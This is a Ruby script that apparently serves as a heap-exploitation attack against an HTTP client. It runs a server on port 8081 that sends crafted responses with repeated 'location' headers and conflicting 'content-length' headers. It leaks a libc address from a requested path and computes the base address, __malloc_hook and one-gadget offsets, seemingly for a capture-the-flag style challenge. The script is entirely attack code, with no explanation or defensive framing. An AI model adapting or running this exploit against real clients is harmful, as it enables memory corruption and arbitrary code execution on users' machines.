require 'socket'

NL = "\r\n"

rel_gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
rel_mallochook = 0x2ebc30

$gs = TCPServer.open('0.0.0.0', 8081)
addr = $gs.addr
addr.shift
printf("server is on %s\n", addr.join(":"))

def f
  yield $gs.accept
end

$libc_base = nil

A = 'a'
B = 'b'*0x130

f do |s|
  path = s.gets.scan(%r!GET /(.*) HTTP/1.1!)[0][0]

  puts '[a]'

  gets
  s.print [
    ['content-length', '0'],
    *[['location', '/' + B]]*8,
    ['content-length', '100'],
    *[['location', '/']],
  ].map{|x|x.join(': ')}.join(NL)
  s.print NL
  s.print NL
end

f do |s|
      puts '[ ]'

      s.print [
        ['location', '/'],
      ].map{|x|x.join(': ')}.join(NL)
      s.print NL
      s.print NL
end

f do |s|
  path = s.gets.scan(%r!GET /(.*) HTTP/1.1!)[0][0]

  puts '[b] %s' % path.unpack1("H*")
  $libc_base = (0.chr + path + 0.chr*100).unpack1("Q*") - 0x3ebc00
  puts '[b] libc_base = %016x' % $libc_base

  gets
  s.print [
    ['content-length', '185'],
    ['location', '/' + ?c*40],
    ['location', '/' + ?c*40],
    ['location', '/' + ?c*40],
    ['location', '/' + ?c*40],
  ].map{|x|x.join(': ')}.join(NL)
  s.print NL
  s.print NL
end

f do |s|
  path = s.gets.scan(%r!GET /(.*) HTTP/1.1!)[0][0]

  puts '[c] %s' % path

  mallochook = $libc_base + rel_mallochook
  gadget = $libc_base + rel_gadgets[0]

  gets
  s.print [
    ['content-length', '0'],
    ['location', '/' + ?c*40],
    *[['location', '/aaaoaa']]*20,
  ].map{|x|x.join(': ')}.join(NL)
  s.print NL
  s.print NL
end

gets
